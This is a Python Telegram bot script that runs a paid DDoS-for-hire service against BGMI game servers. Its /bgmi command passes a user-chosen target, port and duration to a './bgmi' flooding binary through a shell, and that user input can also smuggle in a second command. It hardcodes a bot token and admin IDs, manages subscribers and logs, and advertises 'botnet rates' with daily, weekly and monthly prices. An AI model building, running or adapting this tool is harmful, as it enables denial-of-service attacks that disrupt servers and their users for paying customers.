#!/usr/bin/python3
#@CRACKWARS_DANGER

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7244429853:AAFD_sdfSY5gwGnj5JxmNvVE_dqeKtM7OIg')

# Admin user IDs
admin_id = {"6682104026", "1753312395"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully 🗑️"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle the reply when users start an attack
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🔥 {username}, Attack Started! 🔥\n\n🎯 Target: {target}\n🚪 Port: {port}\n⏱️ Time: {time} seconds\n\n🛡️ Method: BGMI\n@dakkucheats"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "⏳ You Are On Cooldown. Please Wait 5 minutes Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 240:
                response = "⚠️ Error: Time interval must be less than 240 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"🎮 BGMI Attack Finished! 🎮\n\n🎯 Target: {target}\n🚪 Port: {port}\n⏱️ Time: {time} seconds"
        else:
            response = "✅ Usage: /bgmi <target> <port> <time>\n@dakkucheats"  # Updated command syntax
    else:
        response = "🚫 You Are Not Authorized To Use This Command.\n@dakkucheats"

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📜 Your Command Logs:\n\n" + "".join(user_logs)
                else:
                    response = "📜 No Command Logs Found For You."
        except FileNotFoundError:
            response = "📜 No command logs found."
    else:
        response = "🚫 You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🌟 Available commands 🌟:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use ❗.
 /mylogs : To Check Your Recent Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 @dakkucheats
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🎉 Welcome to Your Home, {user_name}! 🎉\nFeel Free to Explore. Try To Run This Command: /help\n\n🔥 Welcome To The World's Best DDoS Bot 🔥\n@dakkucheats"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''📜 {user_name}, Please Follow These Rules 📜:

1. 🚫 Don't Run Too Many Attacks! This May Lead To A Ban From The Bot.
2. ⚠️ Don't Run 2 Attacks At The Same Time As It Can Lead To A Ban.
3. 🕵️ We Daily Check The Logs, So Please Follow These Rules To Avoid A Ban!

@dakkucheats'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''🌐 {user_name}, We Have The Most Powerful DDoS Plan For You! 🌐:


 ⏱️ Attack Time: 240 seconds
 🕒 After Attack Limit: 4 Minutes
 🚀 Concurrent Attacks: 300

💰 Price List:
📅 Day: ₹200
📅 Week: ₹900
📅 Month: ₹1600

@dakkucheats
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f'''👑 {user_name}, Admin Commands Are Here! 👑:

/add <userId> : Add a User.
/remove <userid> : Remove a User.
/allusers : Authorized Users List.
/logs : All Users' Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.

@dakkucheats
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "📣 Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "📣 Broadcast Message Sent Successfully To All Users."
        else:
            response = "📣 Please Provide A Message To Broadcast."
    else:
        response = "🚫 Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "🗑️ Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "🗑️ Logs Cleared Successfully"
        except FileNotFoundError:
            response = "🗑️ Logs are already cleared."
    else:
        response = "🚫 Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "👥 Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "👤 No data found"
        except FileNotFoundError:
            response = "👤 No data found"
    else:
        response = "🚫 Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "📜 No data found."
                bot.reply_to(message, response)
        else:
            response = "📜 No data found"
            bot.reply_to(message, response)
    else:
        response = "🚫 Only Admin Can Run This Command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🆔 Your ID: {user_id}"
    bot.reply_to(message, response)

bot.polling()
#@CRACKWARS_DANGER
